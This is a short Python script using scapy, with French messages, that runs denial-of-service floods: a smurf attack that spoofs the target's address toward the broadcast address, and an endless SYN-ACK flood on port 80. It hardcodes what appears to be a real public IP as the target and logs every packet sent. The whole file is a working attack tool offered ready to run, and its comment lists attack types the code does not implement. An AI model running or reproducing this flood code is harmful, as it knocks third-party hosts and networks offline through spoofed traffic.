import sys
import time
from scapy.all import IP, ICMP, TCP, send
from time import sleep
import csv

def ddos(target_ip, attack_type):
    broadcast_ip = "255.255.255.255"
    try:
        with open('attack_log.csv', 'a', newline='') as file:
            writer = csv.writer(file)
            if attack_type == 'smurf':
                while True:
                    pkt = IP(src=target_ip, dst=broadcast_ip) / ICMP()
                    print(pkt.summary())
                    send(pkt, verbose=0)
                    writer.writerow([time.time(), target_ip, "smurf"])
                    sleep(0.1)
            elif attack_type == 'syn_ack':
                while True:
                    pkt = IP(dst=target_ip) / TCP(dport=80, flags='SA')
                    print(pkt.summary())
                    send(pkt, verbose=0)
                    writer.writerow([time.time(), target_ip, "syn_ack"])
                    sleep(0.1)
            else:
                print(f"Type d'attaque non valide : {attack_type}")
    except KeyboardInterrupt:
        print("\nAttaque arrêtée par l'utilisateur.")
        sys.exit(0)

# Variables
target_ip = "163.173.228.225"
attack_type = 'syn_ack'  # syn_flood, pod, syn_ack, smurf

try:
    ddos(target_ip, attack_type)
except KeyboardInterrupt:
    print("\nAttaque arrêtée par l'utilisateur.")